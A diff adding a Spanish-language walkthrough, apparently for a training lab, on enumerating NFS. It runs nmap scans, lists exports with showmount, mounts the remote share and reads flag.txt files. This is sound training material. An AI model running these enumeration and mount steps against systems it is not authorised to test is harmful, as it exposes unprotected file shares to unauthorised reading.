@@ -340,4 +340,60 @@ NFS mal configurado puede equivaler a acceso root remoto sin autenticación real
 
 ---
 
-FIN DEL LIENZO
+
+
+## Preguntas
+
+
+#### Enumere el servicio NFS y envíe el contenido de flag.txt en el recurso compartido "nfs" como respuesta.
+
+Enviamos una traza `ICMP` al host para verificar que esté activo:
+<img width="836" height="211" alt="image" src="https://github.com/user-attachments/assets/acccb1db-05cd-4b1a-a1c5-eca7c980613a" />
+
+Realizamos un escaneo `TCP SYN` al host para descubrir sus puertos abiertos:
+```bash
+nmap -Pn -n --reason -sS <ip>
+```
+<img width="841" height="331" alt="image" src="https://github.com/user-attachments/assets/f07531d2-982d-443f-ab8f-571daa6e668a" />
+
+Vemos que el servidor tiene los puertos 111 y 2049 que son los correspondientes al servicio `NFS`.
+
+Realizamos un escaneo con nmap de versiones con los scripts NSE correspondientes a `NFS`:
+```bash
+find / -type f -name "nfs*" 2>/dev/null  |grep scripts
+nmap --script=nfs* -sV -p111,2049 10.129.5.154
+```
+
+<img width="1170" height="496" alt="image" src="https://github.com/user-attachments/assets/d18c349b-950e-43c6-941e-fc06980f079a" />
+
+Enumeramos manualmente con `showmount`:
+```bash
+showmount -e <ip>
+```
+
+Obtenemos los shares:
+<img width="421" height="132" alt="image" src="https://github.com/user-attachments/assets/e9b3c9c6-969f-45e4-ab09-3c5ebecb8579" />
+
+Creamos la carpeta para el montaje:
+```bash
+mkdir /tmp/target-NFS
+```
+
+Montamos en la carpeta:
+```bash
+mount -t nfs 10.129.5.154:/ /tmp/target-NFS/ -o nolock
+```
+
+<img width="805" height="728" alt="image" src="https://github.com/user-attachments/assets/6470a7b3-5185-4b22-82c7-4e0871fe3f17" />
+
+Leemos las flags:
+```bash
+find . -type f -name "flag.txt" | xargs cat
+```
+<img width="753" height="128" alt="image" src="https://github.com/user-attachments/assets/55f6cd7c-49c8-4bf8-891a-ede36e27e4b3" />
+
+
+
+#### Enumere el servicio NFS y envíe el contenido de flag.txt en el recurso compartido "nfsshare" como respuesta.
+
+Se resolvió en el ejercicio anterior
